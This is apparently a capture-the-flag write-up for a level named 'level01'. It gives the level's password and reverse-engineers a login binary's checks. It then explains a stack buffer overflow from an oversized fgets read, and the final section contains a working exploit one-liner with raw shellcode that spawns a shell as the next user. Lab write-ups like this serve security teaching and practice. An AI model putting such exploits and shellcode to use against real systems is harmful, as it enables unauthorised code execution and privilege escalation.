## level01

	username: level01
	password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

### Mitigations applied:

```
$ checksec --file level01
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level01
```

### Usage:

The program prompts the user for a username and exits if invalid.

```
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: user
verifying username....

nope, incorrect username...
```

Otherwise it prompts for a password then exits.

```
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
pass
nope, incorrect password...
```

### Analysis:

`fgets` is used to get the username which is stored in a global valriable `a_user_name`. then `verify_user_name()` is called.

```c
/*
   0x08048510 <+64>:	mov    eax,ds:0x804a020
   0x08048515 <+69>:	mov    DWORD PTR [esp+0x8],eax
   0x08048519 <+73>:	mov    DWORD PTR [esp+0x4],0x100
   0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
 */
fgets(a_user_name, 0x100, stdin);
/*
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
   0x08048532 <+98>:	mov    DWORD PTR [esp+0x5c],eax
 */
var2 = verify_user_name();
```

This function simply compares the username with the string `dat_wil`.

```c
/*
   0x08048478 <+20>:	mov    edx,0x804a040
   0x0804847d <+25>:	mov    eax,0x80486a8
   0x08048482 <+30>:	mov    ecx,0x7
   0x08048487 <+35>:	mov    esi,edx
   0x08048489 <+37>:	mov    edi,eax
   0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 */
return (strncmp("dat_wil", a_user_name, 0x7));
```

If the strings are not equal, the program exits.

```c
/*
   0x08048536 <+102>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804853b <+107>:	je     0x8048550 <main+128>
 */
if (var2 != 0)
{
	/*
	   0x0804853d <+109>:	mov    DWORD PTR [esp],0x80486f0
	   0x08048544 <+116>:	call   0x8048380 <puts@plt>
	 */
	puts("nope, incorrect username...\n");
	return (0x1);
}
```

In case of a valid username, the password is taken and verified the same way.

```
/*
   0x0804855c <+140>:	mov    eax,ds:0x804a020
   0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
   0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804856d <+157>:	lea    eax,[esp+0x1c]
   0x08048571 <+161>:	mov    DWORD PTR [esp],eax
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
 */
fgets(var1, 0x64, stdin);
/*
   0x08048579 <+169>:	lea    eax,[esp+0x1c]
   0x0804857d <+173>:	mov    DWORD PTR [esp],eax
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
 */
var2 = verify_user_pass(var1);
```

`verify_user_pass()` compares the password with the string `admin`

```
/*
   0x080484a8 <+5>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484ab <+8>:	mov    edx,eax
   0x080484ad <+10>:	mov    eax,0x80486b0
   0x080484b2 <+15>:	mov    ecx,0x5
   0x080484b7 <+20>:	mov    esi,edx
   0x080484b9 <+22>:	mov    edi,eax
   0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 */
return (strncmp("admin", s, 0x5));
```

Upon return, the program exits whether the password is valid or not.

```
/*
   0x08048589 <+185>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804858e <+190>:	je     0x8048597 <main+199>
   0x08048590 <+192>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x08048595 <+197>:	je     0x80485aa <main+218>
 */
if (var2 == 0 || var2 != 0)
{
	/*
	   0x08048597 <+199>:	mov    DWORD PTR [esp],0x804871e
	   0x0804859e <+206>:	call   0x8048380 <puts@plt>
	 */
	puts("nope, incorrect password...\n");
	return (0x1);
}
```

The problem here is when inserting the password `fgets()` accepts 0x64 characters while the buffer user is only 0x10 bytes long, as can be seen at the begining of the `main()` when filling it with 0x0

```
0x080484db <+11>:	lea    ebx,[esp+0x1c]
0x080484df <+15>:	mov    eax,0x0
0x080484e4 <+20>:	mov    edx,0x10
0x080484e9 <+25>:	mov    edi,ebx
0x080484eb <+27>:	mov    ecx,edx
0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
```

This problem allows us to overwrite the return address (`EIP`) and control the execution flow.

### Exploit

To find the offset to overwrite the return address, we started gdb and set a breakpoint after `fgets()` returns.

```
$ gdb -q ./level01
(gdb) b *main + 169
```
We ran the program by providing the valid username `dat_wil` followed by 84 bytes, then examined the stack to see where our input resides.

```
(gdb) r < <(python -c 'print("dat_wil\n"+"A"*80+"BBBB")')
(gdb) x/28xw $esp
0xffffd6b0:	0xffffd6cc	0x00000064	0xf7fcfac0	0x00000001
0xffffd6c0:	0xffffd8d9	0x0000002f	0xffffd71c	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd700:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd710:	0x41414141	0x41414141	0x41414141	0x42424242
```

After continuing execution, we noticed a `SIGSEGV` at the address `0x42424242`.

> 0x42 is the ascii representation of the letter `B`

```
(gdb) c
...
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

After finding the offset we injected a shellcode instead of `A`'s and its address at the position of `B`'s.

We needed to tweak the address of the shellcode as it was different from what we can see above when running the program outside `gdb`.

```
$ python -c 'print("dat_wil\n"+"\x90"*(80-70)+"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"+"\x90"*20+"\x2c\xde\xff\xff")' | env -i ./level01
...
$ whoami
level02
```
